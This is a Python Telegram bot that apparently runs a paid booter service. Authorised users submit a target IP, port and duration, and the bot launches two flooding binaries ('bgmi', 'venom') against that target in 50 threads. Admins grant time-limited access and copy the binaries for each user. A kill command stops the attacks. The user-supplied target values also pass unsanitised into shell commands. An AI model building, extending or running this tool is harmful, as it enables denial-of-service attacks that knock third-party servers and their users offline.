import telebot
import subprocess
import datetime
import os
import time
import json
import shutil
import logging
import fcntl
import sys
from telebot import types
from threading import Thread, Lock
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# --- Configuration Loading ---
CONFIG_FILE = "config.json"

def load_config():
    with open(CONFIG_FILE, 'r') as f:
        return json.load(f)

def write_config(config_data):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config_data, f, indent=4)

config = load_config()
bot = telebot.TeleBot(config['bot_token'])
ADMIN_IDS = set(config.get('admin_ids', []))
USER_FILE = config.get('user_file', 'users.json')
LOG_FILE = config.get('log_file', 'bot.log')
admin_balances = config.get('admin_balances', {})

# Binary Paths
ORIGINAL_BGMI_PATH = '/root/venom/bgmi'
ORIGINAL_VENOM_PATH = '/root/venom/venom'

# Lock for thread-safe operations
bot_lock = Lock()

# --- Helper Functions ---
def read_users():
    try:
        if not os.path.exists(USER_FILE): return {}
        with open(USER_FILE, 'r') as f:
            data = json.load(f)
            return {uid: datetime.datetime.fromisoformat(exp) for uid, exp in data.items()}
    except Exception as e:
        logger.error(f"Error reading users: {e}")
        return {}

def write_users(users_dict):
    with open(USER_FILE, 'w') as f:
        json.dump({uid: exp.isoformat() for uid, exp in users_dict.items()}, f)

allowed_user_ids = read_users()

def is_authorized(user_id):
    return user_id in ADMIN_IDS or str(user_id) in allowed_user_ids

def admin_only(func):
    def wrapper(message):
        if message.from_user.id in ADMIN_IDS:
            return func(message)
        bot.reply_to(message, "❌ **Only admins can use this command.**", parse_mode="Markdown")
    return wrapper

# --- Shell & Threading Logic ---
def shell_executor(command):
    """Thread-safe shell execution."""
    try:
        with bot_lock:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return process
    except Exception as e:
        logger.error(f"Shell execution failed: {e}")
        return None

def run_attack_process(target, port, duration, b_path, v_path, thread_count=20):
    """Thread-safe attack process execution."""
    cmd_bgmi = f"{b_path} {target} {port} {duration} 200"
    cmd_venom = f"{v_path} {target} {port} {duration} 200"
    
    processes = []
    
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        for _ in range(thread_count // 2):
            processes.append(executor.submit(shell_executor, cmd_bgmi))
            processes.append(executor.submit(shell_executor, cmd_venom))
    
    return processes

# --- Command Handlers ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(types.KeyboardButton('🚀 Attack'), types.KeyboardButton('ℹ️ My Info'))
    bot.send_message(message.chat.id, "🔰 **BOT READY** 🔰", reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == '🚀 Attack')
def attack_request(message):
    if is_authorized(message.chat.id):
        bot.send_message(message.chat.id, "🎯 **Enter IP, Port, and Duration:**\nExample: `1.1.1.1 80 120`", parse_mode="Markdown")
        bot.register_next_step_handler(message, process_attack)
    else:
        bot.send_message(message.chat.id, "🚫 **Unauthorized!**")

def process_attack(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, "⚠️ **Invalid Format.** Use: `IP PORT TIME`")
            return
            
        target, port, duration = args[0], args[1], args[2]
        if int(duration) > 240:
            bot.reply_to(message, "❌ Max time is 240s.")
            return

        u_id = str(message.chat.id)
        b_path = ORIGINAL_BGMI_PATH if message.chat.id in ADMIN_IDS else f"./bgmi{u_id}"
        v_path = ORIGINAL_VENOM_PATH if message.chat.id in ADMIN_IDS else f"./venom{u_id}"

        for path in [b_path, v_path]:
            if os.path.exists(path):
                os.chmod(path, 0o755)

        Thread(target=run_attack_process, args=(target, port, duration, b_path, v_path, 50)).start()
        
        bot.send_message(message.chat.id, f"🚀 **Request Sent!**\nTarget: `{target}:{port}`\nDuration: `{duration}s`\nThreads: `50`", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"⚠️ **Error: {e}**")

@bot.message_handler(commands=['stop'])
@admin_only
def stop_attack(message):
    """Stop all attack processes."""
    try:
        with bot_lock:
            kill_commands = [
                "pkill -9 -f bgmi",
                "pkill -9 -f venom",
                "pkill -9 -f soul",
                "pkill -9 -f '/root/venom/'"
            ]
            
            for cmd in kill_commands:
                subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        bot.reply_to(message, "🛑 **All processes terminated successfully.**", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['add'])
@admin_only
def add_user(message):
    args = message.text.split()
    if len(args) == 3:
        user_id, days = args[1], int(args[2])
        expiry = datetime.datetime.now() + datetime.timedelta(days=days)
        allowed_user_ids[user_id] = expiry
        write_users(allowed_user_ids)
        
        try:
            shutil.copy(ORIGINAL_BGMI_PATH, f'bgmi{user_id}')
            shutil.copy(ORIGINAL_VENOM_PATH, f'venom{user_id}')
            os.chmod(f'bgmi{user_id}', 0o755)
            os.chmod(f'venom{user_id}', 0o755)
        except Exception as e:
            logger.error(f"Failed to copy binaries: {e}")

        bot.reply_to(message, f"✅ User `{user_id}` added for `{days}` days.")
    else:
        bot.reply_to(message, "Usage: `/add <userId> <days>`")

@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def my_info(message):
    u_id = str(message.chat.id)
    role = "Admin" if message.chat.id in ADMIN_IDS else "User"
    expiry = allowed_user_ids.get(u_id, "Lifetime" if role == "Admin" else "No Access")
    
    msg = (f"👤 **Profile Info**\n"
           f"Type: `{role}`\n"
           f"Expiry: `{expiry}`")
    bot.send_message(message.chat.id, msg, parse_mode="Markdown")

# --- Main execution with error handling ---
def run_bot():
    """Run the bot with proper error handling and single instance check."""
    logger.info("Starting bot...")
    
    # Check if another instance is already running
    try:
        bot_info = bot.get_me()
        logger.info(f"Bot @{bot_info.username} is ready")
    except Exception as e:
        logger.error(f"Failed to connect to Telegram API: {e}")
        return
    
    # Single instance polling with proper error handling
    while True:
        try:
            logger.info("Starting polling...")
            bot.polling(none_stop=True, interval=2, timeout=30)
        except Exception as e:
            logger.error(f"Polling error: {e}")
            time.sleep(5)

if __name__ == '__main__':
    # Ensure only one instance runs using file locking
    lock_file = '/tmp/telegram_bot.lock'
    try:
        lock_fd = open(lock_file, 'w')
        fcntl.flock(lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except IOError:
        print("Another instance is already running. Exiting.")
        sys.exit(1)
    
    try:
        run_bot()
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    finally:
        fcntl.flock(lock_fd, fcntl.LOCK_UN)
        lock_fd.close()
        os.remove(lock_file)
